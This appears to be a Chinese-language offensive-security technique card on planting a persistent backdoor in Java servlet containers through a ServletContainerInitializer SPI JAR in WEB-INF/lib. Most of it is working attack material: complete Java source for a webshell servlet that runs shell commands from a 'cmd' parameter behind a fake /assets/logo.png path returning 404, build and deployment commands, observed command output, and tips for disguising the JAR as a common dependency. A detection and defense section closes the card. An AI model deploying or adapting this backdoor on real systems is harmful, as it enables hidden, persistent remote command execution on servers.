---
id: web-java-classloader-servletcontainerinitializer-spi-backdoor
title: ServletContainerInitializer SPI 注入：WEB-INF/lib 放置 JAR 自动注册后门 Servlet
type: scenario
domain: web
path: web/java/classloader
technique: servletcontainerinitializer-spi-backdoor
aliases:
- SCI 后门
- ServletContainerInitializer SPI 注入
- Tomcat 自动注册 Servlet
- WEB-INF/lib 后门
- 零配置 Web 后门
- SCI 内存马（文件驻留）
severity: high
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-05'
tags:
- java
- spi
- servlet
- tomcat
- webshell
- backdoor
- classloader
- servlet3
cve: []
verification:
  verified_by: verifier-V10
  verified_at: '2026-11-05T00:42:03+08:00'
  notes: 已对照原文与截图核对 SCI SPI 注册、Tomcat 10.1.55 重启后 /assets/logo.png 命令回显与投放前 404；未验证点：未在本机复现，依赖原文截图；前提为可写 WEB-INF/lib
---

## 一句话结论

把一个在 `META-INF/services/jakarta.servlet.ServletContainerInitializer`（老版本为 `javax.servlet.ServletContainerInitializer`）中注册了实现类的 JAR 放入 `WEB-INF/lib`，Servlet 3.0+ 容器启动时会自动加载并调用其 `onStartup()`；实现类利用 `ServletContext.addServlet()` 动态注册一个命令执行 Servlet，无需修改 `web.xml`、无需注解、无需改动应用代码，重启后后门依然生效。

## 原理

- Servlet 3.0 起的 `ServletContainerInitializer`（SCI）机制允许库/框架在容器启动时自动执行初始化逻辑，Spring、JSF、WebSocket 等均依赖它。
- 容器启动时扫描每个 Web 应用 `WEB-INF/lib` 下所有 JAR，查找 `META-INF/services/jakarta.servlet.ServletContainerInitializer`（Tomcat 10+ 使用 `jakarta.*`；Tomcat 9 及更早使用 `javax.*`），通过 `ServiceLoader` 加载声明的实现类并调用 `onStartup(Set<Class<?>>, ServletContext)`。
- `onStartup()` 拿到的 `ServletContext` 拥有对 Web 应用的完全控制权：可 `addServlet`、`addFilter`、`addListener`、设置属性、操作会话配置。攻击者据此动态注册后门 Servlet 并映射到一个看似静态资源的路径。
- 因为注册发生在容器启动阶段、通过 API 完成，`web.xml` 与源码中都不留痕；没有 `@WebServlet` 注解，注解扫描也发现不了。
- 后门 Servlet 的 `doGet` 读取 `cmd` 参数并用 `ProcessBuilder("/bin/sh","-c",cmd)` 执行；无 `cmd` 时返回 404，伪装成不存在的静态资源。JAR 在 `WEB-INF/lib` 中，容器每次启动都会重新加载，因此是**文件驻留型**持久化，删除 JAR 并重启才会清除。

## 触发条件

1. 攻击者能向目标 Web 应用的 `WEB-INF/lib` 写入 JAR（上传、文件写入、共享存储、依赖投毒等）。
2. 容器为 Servlet 3.0+（Tomcat 7+ 等主流容器），且未配置 SCI 过滤白名单。
3. JAR 的 SPI 描述文件与容器的命名空间匹配（`jakarta.servlet` 或 `javax.servlet`）。
4. 容器允许动态注册 Servlet（默认允许）。

## 利用步骤

1. 编写 `ServletContainerInitializer` 实现，在 `onStartup()` 中 `ctx.addServlet(...)` 并 `addMapping("/assets/logo.png")`，`setLoadOnStartup(1)`。
2. 编写后门 Servlet，`doGet` 读取 `cmd` 执行命令；无参数返回 404。
3. 创建 `META-INF/services/jakarta.servlet.ServletContainerInitializer`，内容为实现类全限定名。
4. 编译打包为 JAR，放入目标 `WEB-INF/lib`。
5. 重启容器（或等待应用重载），SCI 自动执行，后门 Servlet 注册完成。
6. 访问伪装路径带 `cmd=` 执行命令；无参数访问表现为 404，日志中只记录对静态图片的 GET。

## PoC

SCI 入口：

```java
public class BackdoorInitializer implements ServletContainerInitializer {
    @Override
    public void onStartup(Set<Class<?>> classes, ServletContext ctx) {
        ServletRegistration.Dynamic reg =
            ctx.addServlet("resource-handler", WebshellServlet.class);
        if (reg != null) {
            reg.addMapping("/assets/logo.png");
            reg.setLoadOnStartup(1);
        }
    }
}
```

后门 Servlet：

```java
public class WebshellServlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
        String cmd = req.getParameter("cmd");
        resp.setContentType("text/plain; charset=UTF-8");
        PrintWriter out = resp.getWriter();
        if (cmd == null || cmd.isEmpty()) {
            resp.setStatus(HttpServletResponse.SC_NOT_FOUND);   // 伪装
            return;
        }
        Process p = new ProcessBuilder("/bin/sh", "-c", cmd)
            .redirectErrorStream(true).start();
        new BufferedReader(new InputStreamReader(p.getInputStream()))
            .lines().forEach(out::println);
    }
}
```

SPI 文件 `META-INF/services/jakarta.servlet.ServletContainerInitializer`：

```text
com.research.sci.BackdoorInitializer
```

打包与投放：

```bash
javac -cp $TOMCAT_HOME/lib/servlet-api.jar -d build \
    BackdoorInitializer.java WebshellServlet.java
mkdir -p build/META-INF/services
echo "com.research.sci.BackdoorInitializer" \
    > build/META-INF/services/jakarta.servlet.ServletContainerInitializer
cd build && jar cf ../sci-backdoor.jar com/ META-INF/
cp sci-backdoor.jar $TOMCAT_HOME/webapps/testapp/WEB-INF/lib/
```

原文实测：投放前 `/testapp/assets/logo.png?cmd=id` 返回 404；投放并重启 Tomcat 10.1.55 后，同一 URL 返回 `uid=1000(nl)...`，`?cmd=whoami` 返回 `nl`，`?cmd=uname+-a` 返回内核信息。

## 变体与关联

- Tomcat 9 及更早使用 `javax.servlet.ServletContainerInitializer`，描述文件与 import 需相应替换。
- 可把 JAR 命名为 `spring-context-support-6.1.8.jar`、`commons-logging-1.3.2.jar` 等常见依赖名，降低巡检发现概率。
- 与 JSP 内存马相比：本手法不写 JSP、不改 `web.xml`、无需注解，后门在容器启动时自动激活，且重启后仍存活（JAR 在即生效）；内存马则重启即失效。
- 同属 SPI 攻击面：JDBC Driver 劫持可窃取数据库凭证（见独立卡片）；FileSystemProvider、URLStreamHandlerProvider、ScriptEngineFactory 等原文仅给思路、未完整验证，未单独建卡。
- 可与其他 SPI 入口组合，在同一 JAR 中同时注册多个服务。

## 检测与防御

- 类路径 SPI 扫描：遍历 `WEB-INF/lib` 及 classpath 上所有 JAR，列出 `META-INF/services/*` 及实现类，与已知合法清单比对；发现非标准包名的 `ServletContainerInitializer` 即告警。
- Tomcat 配置 `containerSciFilter` 限制 SCI 类：黑名单过滤可疑包，或白名单只允许 Spring/Apache 等已知 SCI（注意正则方向）。
- 文件完整性监控：监控 `WEB-INF/lib/`、应用 classpath 目录与 Maven/Gradle 本地仓库的 JAR 增删改；定期比对线上 JAR 与依赖声明清单。
- JAR 签名验证与依赖锁定：使用 `jarsigner -verify`，配置依赖锁与校验和，私有仓库启用上传审计。
- 运行时监控：记录所有 SPI 加载活动与来源路径；访问日志中关注伪装成静态资源但带 `cmd`/`exec` 参数的请求。
- 最小化类路径，不把用户可控目录纳入 classpath；Web 应用目录不可由上传功能直接写入。
